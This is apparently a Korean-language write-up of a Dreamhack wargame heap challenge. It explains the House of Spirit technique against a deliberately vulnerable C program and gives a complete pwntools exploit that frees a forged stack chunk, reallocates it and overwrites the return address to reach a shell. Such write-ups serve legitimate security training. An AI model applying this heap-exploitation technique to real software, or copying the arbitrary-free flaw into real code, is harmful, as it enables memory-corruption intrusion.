---
title: "house_of_spirit writeup"
date: 2026-04-07 03:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, heap, house-of-spirit, dreamhack]
---

## Analysis

### checksec
```
root@a237909c5b9c:/pwn/house_of_spirit# checksec house_of_spirit
[*] '/pwn/house_of_spirit/house_of_spirit'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

### Source Code
```c
// gcc -o hos hos.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
	execve("/bin/sh", NULL, NULL);
}

int main() {
	char name[32];
	int idx, i, size = 0;
	long addr = 0;

	initialize();
	memset(name, 0, sizeof(name));
	printf("name: ");
	read(0, name, sizeof(name)-1);

	printf("%p: %s\n", name, name);
	while(1) {
		printf("1. create\n");
		printf("2. delete\n");
		printf("3. exit\n");
		printf("> ");

		scanf("%d", &idx);

		switch(idx) {
			case 1:
				if(i > 10) {
					return -1;
				}
				printf("Size: ");
				scanf("%d", &size);

				ptr[i] = malloc(size);

				if(!ptr[i]) {
					return -1;
				}
				printf("Data: ");
				read(0, ptr[i], size);
				i++;
				break;
			case 2:
				printf("Addr: ");
				scanf("%ld", &addr);

				free(addr);
				break;
			case 3:
				return 0;
			default: 
				break;
		}
	}

	return 0;
}
```

## Vulnerability Analysis

`create`는 입력으로 `size`를 받고 그 크기로 `malloc`한 후 해당 메모리에 `size`만큼 데이터를 입력받는다. 최대 10번만 호출할 수 있다. `delete`는 임의의 주소를 입력받아 그 주소로 `free`를 호출한다.

House of Spirit 기법은 임의의 주소로 `free`를 호출하여 가짜 청크를 bin에 넣고, 이후 같은 크기로 `malloc`하여 가짜 청크를 할당받아 임의의 주소에 접근하는 기법이다. 사전에 가짜 청크의 `size`와 그 다음 청크가 될 `size` 필드를 `free` 호출 시 검증을 통과할 수 있도록 조작한 후 `free`를 호출하면 가짜 청크가 bin에 저장된다. bin은 대부분 fastbin이거나 tcache를 사용한다. 이 둘은 병합을 시도하지 않기 때문에 인접한 청크에 해당하는 메모리 위치의 값을 크게 신경 쓰지 않아도 되기 때문이다.

다만 다음 청크가 될 메모리의 `size` 필드는 주의가 필요하다. `free` 도입부에서 현재 청크의 사이즈를 다음과 같이 검사한다.
```c
  if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer");
  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr ("free(): invalid size");
```

`size`가 너무 커서 청크 크기가 가상 주소 공간을 wrap around하는지, 최소 사이즈보다 작은지, 잘못 정렬되었는지를 검사한다.

fastbin의 경우 다음 청크의 `size` 또한 다음과 같이 추가로 검사한다.
```c
  if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))
			  <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
	...
```

다음 청크 사이즈가 헤더 크기보다 작은지, `system_mem` 이상인지 검사한다. `system_mem`은 현재까지 할당된 힙 메모리 크기이다 (mmap으로 할당된 것은 제외).

따라서 `free`를 호출하기 전에 이러한 조건들을 우회할 수 있도록 사전에 헤더의 `size` 필드가 될 메모리 위치의 값을 조작해야 한다. 단, tcache의 경우 다음 청크에 대한 검사는 수행되지 않는다. 이 문제는 tcache를 사용하는 libc 버전이므로 다음 청크의 `size`는 신경 쓰지 않아도 된다.

## Exploit

이 바이너리는 `name`의 주소를 출력해준다. `name`이 `rbp-0x30`임은 disassembly로 확인할 수 있다.
```
pwndbg> disass main
Dump of assembler code for function main:
   0x000000000040095b <+0>:     push   rbp
   0x000000000040095c <+1>:     mov    rbp,rsp
   0x000000000040095f <+4>:     sub    rsp,0x40
   0x0000000000400963 <+8>:     mov    DWORD PTR [rbp-0x38],0x0
   0x000000000040096a <+15>:    mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000400972 <+23>:    mov    eax,0x0
   0x0000000000400977 <+28>:    call   0x4008e4 <initialize>
   0x000000000040097c <+33>:    lea    rax,[rbp-0x30]
   0x0000000000400980 <+37>:    mov    edx,0x20
   0x0000000000400985 <+42>:    mov    esi,0x0
   0x000000000040098a <+47>:    mov    rdi,rax
   0x000000000040098d <+50>:    call   0x400730 <memset@plt>
```

`memset`의 첫 번째 인자로 `rbp-0x30`이 전달되는 것을 확인할 수 있다. `name`은 `rbp-0x30`이므로 `ret`과의 거리는 `0x38`이다. 따라서 `name`을 가짜 청크의 주소로 삼고, 나중에 `malloc`했을 때 `ret`을 덮을 수 있는 크기로 `size`를 설정할 수 있다.

`name`을 가짜 청크의 주소로 결정했다면 헤더의 `size` 필드는 `name+8`에 위치하게 된다. 주의해야 할 점은 `free`할 때 전달하는 주소가 `name`이 아닌 `name+16`이어야 한다는 점이다. `name`은 청크의 시작(chunk pointer)이고, `free`에는 사용자 메모리 영역의 시작(mem pointer)을 전달해야 하기 때문이다. 또한 헤더의 `size` 필드에 들어가는 값은 헤더를 포함한 전체 크기이므로, `malloc` 시에는 헤더 크기를 제외한 48바이트를 요청해야 한다. `get_shell` 함수가 주어졌고 No PIE이므로 해당 주소를 `ret`에 덮어쓰면 쉘을 획득할 수 있다.

아래는 전체 익스플로잇 코드이다.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_spirit")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 11705)

    return r


def main():
    r = conn()

    r.sendafter(b"name: ", p64(0) + p64(64))
    name = int(r.recvuntil(b":")[:-1], 16)
    
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Addr: ", str(name + 16).encode())

    payload = b"A" * 40
    payload += p64(exe.symbols["get_shell"])

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", b"48")
    r.sendafter(b"Data: ", payload)

    r.sendlineafter(b"> ", b"3")
    r.interactive()


if __name__ == "__main__":
    main()
```